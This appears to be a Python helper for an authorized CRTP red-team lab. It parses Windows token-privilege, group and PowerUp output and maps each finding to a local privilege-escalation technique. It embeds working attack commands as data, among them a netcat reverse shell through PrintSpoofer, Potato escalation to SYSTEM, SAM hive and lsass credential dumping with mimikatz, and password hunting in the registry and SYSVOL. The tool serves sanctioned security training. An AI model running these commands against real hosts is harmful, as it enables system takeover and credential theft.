"""
localpriv.py -- local privilege-escalation analyzer for an AUTHORIZED CRTP host.

AD data (SOAPHound/BloodHound) is blind to local privesc. This module works on
HOST-LOCAL enumeration output you capture after you land on a box:

    whoami /priv      -> token privileges  (highest-signal, easy to parse)
    whoami /groups    -> local group membership (local admin? etc.)
    PowerUp           -> Invoke-AllChecks text (best-effort section parse)

It reuses the Finding model from analyze.py and emits the same command-first,
screenshot-checklisted output. It never attacks anything and never writes report
prose -- it reads text you captured and tells you the escalation path.

Usage:
    # 1) print the enumeration commands to run ON the host
    python localpriv.py --enum

    # 2) after capturing output to files, analyze them
    python localpriv.py --priv priv.txt [--groups groups.txt] [--powerup pu.txt] \
                        [--out ../output]

Why local privesc in CRTP (goal = OS command exec, admin not required):
  - You often land as a normal domain user or a service account.
  - You need LOCAL ADMIN / SYSTEM to run mimikatz (dump creds/tickets) for lateral
    movement and domain privesc. That is the usual reason to escalate locally.
"""

from __future__ import annotations
import argparse
import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from analyze import Finding, SEV  # noqa: E402


# --- enumeration command set (run these first, on the host) ------------------
ENUM_COMMANDS = {
    "Identity / token": [
        "whoami /all",
        "whoami /priv",
        "whoami /groups",
    ],
    "Host context": [
        "systeminfo",
        "hostname; ipconfig /all",
        "net user; net localgroup administrators",
    ],
    "Automated (upload tools)": [
        "powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks | Out-File pu.txt\"",
        "winPEASx64.exe > winpeas.txt",
        "Seatbelt.exe -group=all",
    ],
    "Stored creds / quick wins": [
        "cmdkey /list",
        "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword",
        "reg query HKLM /f password /t REG_SZ /s 2>nul",
        "findstr /si password *.xml *.ini *.txt *.config 2>nul",
        "# GPP cpassword in SYSVOL (from any domain host)",
        "findstr /S cpassword \\\\<domain>\\SYSVOL\\*.xml",
    ],
}


# --- token-privilege -> escalation technique (stable, well-known mapping) -----
PRIV_TECHNIQUES = {
    "SeImpersonatePrivilege": {
        "sev": "crit",
        "name": "SeImpersonate -> SYSTEM (Potato)",
        "cmds": {
            "PrintSpoofer": ["PrintSpoofer64.exe -i -c cmd",
                             "PrintSpoofer64.exe -c \"nc <studvm> 4444 -e cmd\""],
            "GodPotato": ["GodPotato-NET4.exe -cmd \"cmd /c whoami\""],
        },
        "why": "Service-account token can impersonate SYSTEM via named-pipe/RPC trick.",
        "note": "Most common service-account escalation. Use port 4444/8888 for any shell.",
    },
    "SeAssignPrimaryTokenPrivilege": {
        "sev": "crit",
        "name": "SeAssignPrimaryToken -> SYSTEM (Potato)",
        "cmds": {"Potato": ["GodPotato-NET4.exe -cmd \"cmd /c whoami\""]},
        "why": "Allows assigning a primary token -> impersonate SYSTEM.",
        "note": "Same family as SeImpersonate.",
    },
    "SeBackupPrivilege": {
        "sev": "high",
        "name": "SeBackup -> read SAM/SYSTEM & sensitive files",
        "cmds": {"reg save": ["reg save hklm\\sam sam.hiv", "reg save hklm\\system system.hiv",
                              "# offline: secretsdump.py -sam sam.hiv -system system.hiv LOCAL"]},
        "why": "Bypasses file DACLs for reads -> dump local hashes offline.",
        "note": "Then crack / pass local admin hash.",
    },
    "SeRestorePrivilege": {
        "sev": "high",
        "name": "SeRestore -> write anywhere (overwrite/binary planting)",
        "cmds": {"abuse": ["# replace a service binary or utilman.exe / sethc.exe"]},
        "why": "Bypasses DACLs for writes -> plant/overwrite privileged binary.",
        "note": "",
    },
    "SeTakeOwnershipPrivilege": {
        "sev": "high",
        "name": "SeTakeOwnership -> own + rewrite privileged file",
        "cmds": {"takeown": ["takeown /f <target>", "icacls <target> /grant <you>:F"]},
        "why": "Take ownership of a privileged file, then modify it.",
        "note": "",
    },
    "SeDebugPrivilege": {
        "sev": "high",
        "name": "SeDebug -> inject into SYSTEM process / dump lsass",
        "cmds": {"mimikatz": ["Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'"]},
        "why": "Debug any process -> read lsass memory / migrate to SYSTEM.",
        "note": "Usually implies near-admin already.",
    },
    "SeLoadDriverPrivilege": {
        "sev": "high",
        "name": "SeLoadDriver -> load malicious driver",
        "cmds": {"note": ["# load vulnerable/signed driver (Capcom etc.) -> SYSTEM"]},
        "why": "Loading a driver runs code in kernel.",
        "note": "Advanced; last resort.",
    },
    "SeManageVolumePrivilege": {
        "sev": "med",
        "name": "SeManageVolume -> full disk access chain",
        "cmds": {"note": ["# SeManageVolumeExploit -> write to protected dirs -> DLL hijack"]},
        "why": "Grants full access over the volume root -> DLL planting.",
        "note": "",
    },
}


def parse_privs(text: str):
    """Return list of (priv_name, state) from `whoami /priv` output."""
    out = []
    for line in text.splitlines():
        m = re.match(r"\s*(Se\w+Privilege)\s+.*?\s+(Enabled|Disabled)\s*$", line)
        if m:
            out.append((m.group(1), m.group(2)))
    return out


def analyze_privs(text: str):
    findings = []
    for name, state in parse_privs(text):
        tech = PRIV_TECHNIQUES.get(name)
        if not tech:
            continue
        findings.append(Finding(
            fid=f"LPRIV-{name}",
            technique=tech["name"],
            crtp_topic="Local Privilege Escalation",
            severity=SEV[tech["sev"]],
            targets=["<current host>"],
            evidence=[f"token holds {name} ({state})"],
            commands=tech["cmds"],
            verify=[
                "escalation 후 whoami 가 'nt authority\\system' 인지",
                "SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지",
            ],
            screenshots=[
                f"whoami /priv 에 {name} 보이는 화면 (escalation 전)",
                "exploit 실행 + whoami == SYSTEM 화면 (escalation 후)",
            ],
            report_notes=tech["why"] + (" " + tech["note"] if tech["note"] else ""),
            priority=6 if tech["sev"] == "crit" else 16,
        ))
    return findings


LOCAL_ADMIN_SIDS = {"S-1-5-32-544"}  # BUILTIN\Administrators


def analyze_groups(text: str):
    findings = []
    low = text.lower()
    if "s-1-5-32-544" in low or re.search(r"\badministrators\b", low):
        # distinguish 'enabled' vs 'deny only'
        is_deny = "deny only" in low and "administrators" in low
        if not is_deny:
            findings.append(Finding(
                fid="LPRIV-LOCALADMIN",
                technique="Already in local Administrators",
                crtp_topic="Local Privilege Escalation",
                severity=SEV["crit"],
                targets=["<current host>"],
                evidence=["token is member of BUILTIN\\Administrators (not deny-only)"],
                commands={"to SYSTEM": ["# bypass UAC or run elevated -> PsExec -s / SYSTEM",
                                         "Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'"]},
                verify=["관리자 프롬프트로 승격되는지", "lsass 덤프 가능한지"],
                screenshots=["whoami /groups 에 Administrators(Enabled) 화면",
                             "승격 후 자격 덤프 화면"],
                report_notes="이미 로컬 관리자 -> SYSTEM/자격덤프로 바로 진행.",
                priority=4,
            ))
    return findings


# --- best-effort PowerUp Invoke-AllChecks parser -----------------------------
POWERUP_SECTIONS = {
    "unquoted": (r"unquoted", "Unquoted service path", "crit",
                 "서비스 경로에 공백+따옴표 없음 -> 상위 경로에 악성 exe 배치"),
    "modifiable service": (r"modifiabl\w*service|CanRestart|ServiceName", "Modifiable service",
                           "crit", "서비스 바이너리/설정 수정 가능 -> SYSTEM 으로 실행"),
    "alwaysinstallelevated": (r"alwaysinstallelevated", "AlwaysInstallElevated",
                              "crit", "모든 .msi 가 SYSTEM 으로 설치 -> 악성 msi"),
    "modifiable path": (r"%PATH%|modifiabl\w*path", "Modifiable %PATH% / DLL hijack",
                        "high", "쓰기 가능한 PATH 디렉터리 -> DLL 하이재킹"),
    "scheduled task": (r"scheduled task|TaskName", "Modifiable scheduled task",
                       "high", "수정 가능한 예약작업 -> 코드 실행"),
}


def analyze_powerup(text: str):
    findings = []
    low = text.lower()
    for key, (pat, title, sev, why) in POWERUP_SECTIONS.items():
        if re.search(pat, low):
            findings.append(Finding(
                fid=f"LPRIV-PU-{key.replace(' ','_')}",
                technique=f"PowerUp: {title}",
                crtp_topic="Local Privilege Escalation",
                severity=SEV[sev],
                targets=["<current host>"],
                evidence=[f"PowerUp output matched '{key}' -> 수동 확인 필요"],
                commands={"PowerUp": [
                    "# 해당 체크의 AbuseFunction 사용 (Invoke-AllChecks 출력에 함께 표시됨)",
                    "# 예: Invoke-ServiceAbuse -Name '<svc>' -Command \"net localgroup administrators <you> /add\"",
                ]},
                verify=["AbuseFunction 실행 성공", "escalation 후 whoami 확인"],
                screenshots=[f"PowerUp {title} 탐지 화면", "abuse 실행 + 권한 상승 화면"],
                report_notes=why + " (PowerUp 자동탐지 -> 반드시 수동 재확인).",
                priority=9 if sev == "crit" else 17,
            ))
    return findings


def _read(path):
    if not path:
        return ""
    with open(path, "r", encoding="utf-8-sig", errors="replace") as fh:
        return fh.read()


def main():
    ap = argparse.ArgumentParser(description="CRTP local privesc analyzer")
    ap.add_argument("--enum", action="store_true", help="print enumeration commands and exit")
    ap.add_argument("--priv", help="file with `whoami /priv` output")
    ap.add_argument("--groups", help="file with `whoami /groups` output")
    ap.add_argument("--powerup", help="file with PowerUp Invoke-AllChecks output")
    ap.add_argument("--out", default=None, help="output dir")
    args = ap.parse_args()

    if args.enum or not (args.priv or args.groups or args.powerup):
        print("# === Run these ON the host (authorized) ===")
        for section, cmds in ENUM_COMMANDS.items():
            print(f"\n## {section}")
            for c in cmds:
                print(f"  {c}")
        print("\n# then: python localpriv.py --priv priv.txt --groups groups.txt --powerup pu.txt")
        return

    findings = []
    findings += analyze_groups(_read(args.groups)) if args.groups else []
    findings += analyze_privs(_read(args.priv)) if args.priv else []
    findings += analyze_powerup(_read(args.powerup)) if args.powerup else []
    findings.sort(key=lambda f: (f.priority, f.fid))

    here = os.path.dirname(os.path.abspath(__file__))
    out_dir = args.out or os.path.join(os.path.dirname(here), "output")
    os.makedirs(out_dir, exist_ok=True)

    with open(os.path.join(out_dir, "localpriv_findings.json"), "w", encoding="utf-8") as fh:
        json.dump([f.dict() for f in findings], fh, ensure_ascii=False, indent=2)

    print(f"[+] local privesc findings = {len(findings)}")
    for f in findings:
        print(f"  {f.priority:>3} [{f.severity:>8}] {f.technique}")
        for ev in f.evidence:
            print(f"        - {ev}")
    if not findings:
        print("  (no known vectors matched — fall back to winPEAS/Seatbelt manual review)")
    print(f"[+] -> {os.path.join(out_dir, 'localpriv_findings.json')}")


if __name__ == "__main__":
    main()
